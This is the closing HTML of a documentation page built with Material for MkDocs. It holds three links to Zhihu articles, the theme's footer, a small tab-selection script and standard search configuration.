<p>https://zhuanlan.zhihu.com/p/387662272</p>
<p>https://zhuanlan.zhihu.com/p/42754565</p>
<p>https://zhuanlan.zhihu.com/p/79058089</p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.3220b9d7.min.js"></script>
      
    
  </body>
</html>